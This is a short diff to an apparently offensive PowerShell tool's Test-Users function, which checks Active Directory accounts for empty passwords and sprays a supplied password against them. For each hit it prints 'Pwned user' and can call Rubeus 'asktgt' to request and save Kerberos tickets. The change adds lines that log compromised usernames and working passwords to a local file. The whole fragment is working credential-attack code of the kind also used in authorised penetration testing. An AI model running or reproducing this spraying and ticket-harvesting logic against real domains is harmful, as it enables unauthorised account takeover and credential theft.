@@ -196,6 +196,7 @@ Function Test-Users {
 
       if ($valid) {
         write-host Pwned user: $_ no password -ForegroundColor Cyan
+        Add-Content -Path .\pwnedusers.txt -Value "Pwned user: $_ no password"
       } 
 
         if ($Spraypass) {
@@ -204,6 +205,7 @@ Function Test-Users {
           
           if ($valid) {
             write-host Pwned user: $_ using password: $Spraypass -ForegroundColor Cyan
+            Add-Content -Path .\pwnedusers.txt -Value "Pwned user: $_ using password: $Spraypass"
               if ($Asktgt) {
                 Load-Rubeus -command "asktgt /user:$_ /password:$Spraypass /outfile:$_.kirbi /nowrap"
               }
